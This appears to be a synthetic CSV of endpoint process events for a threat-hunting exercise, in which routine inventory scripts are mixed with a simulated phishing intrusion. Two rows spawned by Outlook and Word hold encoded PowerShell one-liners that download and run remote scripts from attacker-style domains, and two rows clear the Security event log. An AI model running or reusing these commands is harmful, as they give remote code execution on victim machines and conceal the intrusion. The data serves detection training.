Timestamp,DeviceId,DeviceName,FileName,ProcessId,ProcessCreationTime,ProcessCommandLine,AccountName,InitiatingProcessFileName,InitiatingProcessId
2026-08-08T23:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-CLIN-WS012,powershell.exe,7778,2026-08-08T23:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1401
2026-08-09T23:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-FILE-SRV02,powershell.exe,4595,2026-08-09T23:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,1130
2026-08-12T00:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-WS041,powershell.exe,7235,2026-08-12T00:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1013
2026-08-13T02:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-CLIN-WS011,powershell.exe,7252,2026-08-13T02:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.rpatel,CcmExec.exe,1466
2026-08-14T00:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-CLIN-WS011,powershell.exe,6230,2026-08-14T00:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,968
2026-08-15T02:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-SRV07,powershell.exe,4290,2026-08-15T02:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,1322
2026-08-17T08:38:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-WS042,powershell.exe,6284,2026-08-17T08:38:26.0000000Z,powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAKQA7AEkARQBYACAAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcwBlAGMAdQByAGUALQBtADMANgA1AC0AdgBlAHIAaQBmAHkALgB4AHkAegAvAGEALwBqAC4AcABzADEAJwApAA==,r.kaur,outlook.exe,4120
2026-08-17T09:47:26.0000000Z,c3d4e5f6,NSH-CLIN-WS012,powershell.exe,5511,2026-08-17T09:47:26.0000000Z,powershell.exe -w hidden -nop -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQBzAHkAbgBjAC0AdQBwAGQAYQB0AGUALgB4AHkAegAvAGIALgBwAHMAMQAnACkA,p.deshmukh,winword.exe,3300
2026-08-17T18:12:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-WS042,wevtutil.exe,9104,2026-08-17T18:12:26.0000000Z,wevtutil.exe cl Security,adm.rpatel,cmd.exe,7710
2026-08-17T18:12:26.0000000Z,b2c3d4e5f60718293a4b5c6d7e8f90123456789a,NSH-RSCH-SRV07,wevtutil.exe,9104,2026-08-17T18:12:26.0000000Z,wevtutil.exe cl Security,adm.rpatel,cmd.exe,7710
